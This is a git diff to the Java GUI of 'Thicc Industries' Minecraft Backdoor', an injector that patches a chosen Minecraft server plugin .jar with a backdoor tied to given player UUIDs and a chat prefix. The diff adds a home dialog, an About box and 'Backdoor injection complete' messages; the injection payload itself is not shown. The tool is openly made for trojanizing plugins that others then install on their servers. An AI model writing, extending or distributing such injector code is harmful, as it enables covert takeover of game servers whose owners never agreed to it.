@@ -2,6 +2,9 @@ package com.thiccindustries.backdoor;
 
 import javax.swing.*;
 import javax.swing.filechooser.FileFilter;
+import java.awt.*;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
 import java.io.File;
 
 public class InjectorGUI{
@@ -11,8 +14,41 @@ public class InjectorGUI{
             UIManager.setLookAndFeel(UIManager.getLookAndFeel());
         }catch(Throwable ignored){}
 
-        /*--- Get Files ---*/
+        int result = 999;
+        while(result != JOptionPane.YES_OPTION) {
+            /*--- Home dialog ---*/
+            String[] options = {"Inject", "About", "Close"};
+            result = JOptionPane.showOptionDialog(
+                    null,
+                    "Thicc Industries' Minecraft Backdoor.\n" +
+                            "Requirements:\n" +
+                            "   * Minecraft UUID\n" +
+                            "   * Target plugin .jar file",
+                    "Thicc Industries Injector",
+                    JOptionPane.YES_NO_CANCEL_OPTION,
+                    JOptionPane.PLAIN_MESSAGE,
+                    null,       //no custom icon
+                    options,        //button titles
+                    options[0]      //default button
+            );
 
+            if (result == JOptionPane.NO_OPTION) {
+                JOptionPane.showMessageDialog(
+                        null,
+                        "Created by: MajesticWaffle @ Thicc Industries,\n" +
+                                "Injector Version: 1.2\n" +
+                                "Release Date: March 08 2021\n" +
+                                "License: GPL v3.0",
+                        "Thicc Industries Injector",
+                        JOptionPane.INFORMATION_MESSAGE
+                );
+            }
+
+            if(result == JOptionPane.CANCEL_OPTION)
+                return;
+        }
+
+        /*--- Get Files ---*/
         JFileChooser fc = new JFileChooser();
         fc.setFileFilter(new FileFilter() {
             @Override
@@ -26,10 +62,10 @@ public class InjectorGUI{
             }
         });
 
-        int result = fc.showOpenDialog(null);
+        int result1 = fc.showOpenDialog(null);
 
         //Out dialog cancelled
-        if(result != JFileChooser.APPROVE_OPTION)
+        if(result1 != JFileChooser.APPROVE_OPTION)
             return;
 
         String InPath = fc.getSelectedFile().getPath();
@@ -70,7 +106,13 @@ public class InjectorGUI{
             return;
 
         Injector.SimpleConfig sc = new Injector.SimpleConfig(UUIDList, ChatPrefix);
-        Injector.patchFile(InPath, OutPath, sc);
+        boolean result2 = Injector.patchFile(InPath, OutPath, sc);
+
+        if(result2){
+            JOptionPane.showMessageDialog(null, "Backdoor injection complete.\nIf this project helped you, considering starring it on GitHub.", "Thicc Industries Injector", JOptionPane.INFORMATION_MESSAGE);
+        }else{
+            JOptionPane.showMessageDialog(null, "Backdoor injection failed.\nPlease create a GitHub issue report if necessary.", "Thicc Industries Injector", JOptionPane.ERROR_MESSAGE);
+        }
     }
 
     public static void displayError(String message){
